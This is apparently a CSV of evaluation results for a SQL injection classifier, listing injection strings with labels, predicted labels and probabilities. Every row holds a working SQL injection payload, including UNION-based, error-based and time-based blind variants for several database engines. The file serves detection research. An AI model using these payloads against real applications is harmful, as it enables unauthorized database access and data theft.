text,source,fuzzy_cluster_id,true_label,pred_label,prob_sqli,correct
-9644  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  5616 = 5616,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
"1'|| ( select 'zifu' from dual where 4822 = 4822 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1031,1,1,0.999993085861206,1
1 rlike  ( select  ( case when  ( 6795 = 5898 )  then 1 else 0x28 end  )  )  -- xdkx,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1034,1,1,0.9999932050704956,1
"1%"" )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
"1"" )  as giqb where 4664 = 4664",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1043,1,1,0.999993085861206,1
"1""  )  )   as chal where 6661 = 6661",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1057,1,1,0.9999932050704956,1
"1"" )  as esks where 1138 = 1138",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1068,1,1,0.999993085861206,1
1' )  where 5145 = 5145,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1081,1,1,0.9999932050704956,1
"1"" where 2309 = 2309 or elt ( 5873 = 5873,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1084,1,1,0.9999932050704956,1
"1"" )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""mejy"" = ""mejy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
"-3775' )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
"1"" )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1096,1,1,0.999990701675415,1
"-1597"" where 5933 = 5933 or 3038 = 3038",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1107,1,1,0.9999927282333374,1
1  )  )   and 2006 = 2006,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,499,1,1,0.999993085861206,1
"1'|| ( select 'jnsd' from dual where 2316 = 2316 union all select null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1119,1,1,0.999993085861206,1
"-4927'  )  )   union all select 1924,1924#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1128,1,1,0.9999932050704956,1
"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4250 = 4250 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999992847442627,1
1'  )  )   and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  'opyp' = 'opyp,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
-4108' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'tqjx' = 'tqjx,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
-7453'  )  )   )  or 8571 = 8571--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1141,1,1,0.9999932050704956,1
"-4015"" where 2610 = 2610 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
"-1376%""  )  )   )  or 3458 = 9503 and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1157,1,1,0.9999932050704956,1
"-2734' )  union all select 5510,5510,5510,5510,5510#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1171,1,1,0.9999929666519165,1
( select 2412 =  ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$database ) ||'qzvzq'  )  ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1182,1,1,0.9999929666519165,1
"1' or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
"1"" )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( ""dplf"" like ""dplf",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1192,1,1,0.9999933242797852,1
"-6593"" )  union all select 6216,6216,6216,6216,6216,6216,6216#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1205,1,1,0.999992847442627,1
"1%""  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
"-2085"" )  as hkev where 7730 = 7730 union all select 7730,7730--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1213,1,1,0.9999932050704956,1
"-7868' in boolean mode )  union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1218,1,1,0.9999929666519165,1
1' where 8099 = 8099,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1227,1,1,0.9999929666519165,1
"1""  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  ""duuw"" = ""duuw",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"-9456%""  )  )   or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"-1168  )  )   as vlol where 3475 = 3475 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
-9143 )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"-8614' )  or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
"-3037 )  where 9024 = 9024 union all select 9024,9024--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1243,1,1,0.999993085861206,1
"1"" )  where 2657 = 2657 and 5309 = 7592--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1255,1,1,0.9999932050704956,1
"-1868"" )  where 9495 = 9495 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
"-5863"" or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and ""gkvy"" = ""gkvy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
"1"" where 6347 = 6347 union all select null,null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1257,1,1,0.999992847442627,1
-4384'  )  )   )  or 6872 = 6872 and   (  (   ( 'ukhl' = 'ukhl,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1266,1,1,0.9999932050704956,1
-9148 )  where 2027 = 2027 or 8571 = 8571--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1277,1,1,0.999993085861206,1
"-4355""  )  )   )  or 9323 = 9323#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1288,1,1,0.9999932050704956,1
"-9779'  )  )   or make_set ( 9354 = 9354,7185 )  and   (  (  'hmzj' = 'hmzj",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1302,1,1,0.9999932050704956,1
-7430' )  as xfah where 1596 = 1596 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
1' rlike sleep ( 5 )  and 'gtfo' = 'gtfo,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1313,1,1,0.999993085861206,1
"1"" and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
select case when 4537 = 8418 then 1 else null end--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1323,1,1,0.9999914169311523,1
1 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  -- fyaq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,229,1,1,0.999993085861206,1
"-2872 )  where 8797 = 8797 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
1 )  as tbve where 4828 = 4828,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1333,1,1,0.9999929666519165,1
"-1620  )  )   union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1342,1,1,0.999992847442627,1
1'  )  )   as yqek where 1957 = 1957,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1346,1,1,0.999993085861206,1
"1  )  )   as rual where 4649 = 4649 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1356,1,1,0.9999929666519165,1
1'  )  )   waitfor delay '0:0:5'--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,114,1,1,0.999993085861206,1
"-3130 )  union all select 1741,1741,1741,1741,1741,1741,1741,1741#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1368,1,1,0.9999927282333374,1
"-4589"" )  union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1371,1,1,0.999992847442627,1
1' )  as pogx where 4105 = 4105 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"1"" where 9083 = 9083 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
"-4522"" )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""mbkq"" = ""mbkq",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
"-2028'  )  )   )  union all select 8698,8698,8698,8698#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1384,1,1,0.9999932050704956,1
"1""  )  )   as vigs where 6175 = 6175 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
1'+ ( select uhsy where 4596 = 4596 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  +',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1397,1,1,0.9999932050704956,1
1' or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and 'hokd' = 'hokd,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,229,1,1,0.999993085861206,1
"1%"" and 5411 = 7697 and ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1407,1,1,0.999992847442627,1
-6712'  )  )   as kqff where 9146 = 9146 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1422,1,1,0.9999932050704956,1
"1"" )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""mmgx"" like ""mmgx",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
"1' and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and 'cdgm' like 'cdgm",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
"-8698"" where 1990 = 1990 or  ( 8459 = 8459 ) *4906--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1431,1,1,0.9999929666519165,1
1'+ ( select zpdf where 2938 = 2938,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1433,1,1,0.999993085861206,1
"1' in boolean mode )  and elt ( 1210 = 1210,sleep ( 5  )  )  #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1442,1,1,0.9999932050704956,1
end and   (  (  '%' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1456,1,1,0.9999927282333374,1
"1""  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""ruvo"" like ""ruvo",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
-2402 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) -- szgq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.9999932050704956,1
"-8053"" where 5458 = 5458 or 9323 = 9323#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1469,1,1,0.9999929666519165,1
1'+ ( select qydm where 6019 = 6019,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1492,1,1,0.9999929666519165,1
-7242' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'kfff' = 'kfff,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
1'  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( 'ineq' like 'ineq,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1500,1,1,0.999993085861206,1
"1'  )  )   as arhm where 3268 = 3268 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999933242797852,1
1' )  where 8776 = 8776 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1512,1,1,0.9999932050704956,1
"1"" )  where 6843 = 6843 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1515,1,1,0.9999932050704956,1
1' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'ixzr' = 'ixzr,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.9999929666519165,1
"1 )  where 2678 = 2678 union all select null,null,null,null,null,null,null,null,null#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1527,1,1,0.999992847442627,1
1'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'iuki' = 'iuki,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,263,1,1,0.999993085861206,1
"1%""  )  )   )  or sleep ( 5 )  and   (  (   ( ""%"" = """,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1537,1,1,0.999993085861206,1
-6518'  )  )   as vocx where 2539 = 2539 or  ( 8652 = 2025 ) *2025--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1551,1,1,0.9999933242797852,1
"-5187"" )  union all select 3373,3373#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1571,1,1,0.9999929666519165,1
"1%'  )  )   )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( '%' = '",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
1  )  )   and 3249 = 2985,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1584,1,1,0.9999932050704956,1
"1' )  as fxuk where 6184 = 6184 and make_set ( 9292 = 2785,2785 ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1586,1,1,0.9999932050704956,1
"1"" )  where 2215 = 2215 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,283,1,1,0.999993085861206,1
1'|| ( select 'sbft' where 8748 = 8748,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1597,1,1,0.999993085861206,1
"-3873%'  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
"1"" where 7245 = 7245 and 9198 = 9198--",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1613,1,1,0.9999927282333374,1
"-5606  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,292,1,1,0.9999932050704956,1
"1' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
"1""  )  )   as riui where 2605 = 2605",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1623,1,1,0.9999932050704956,1
"1'+ ( select ijck where 9961 = 9961 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
"1'+ ( select 'asmj' where 7808 = 7808 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5  )  )  +'",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1632,1,1,0.9999932050704956,1
"-9509 )  union all select 1193,1193,1193#",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1644,1,1,0.999993085861206,1
"1'  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 'qpuy' = 'qpuy",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,311,1,1,0.9999932050704956,1
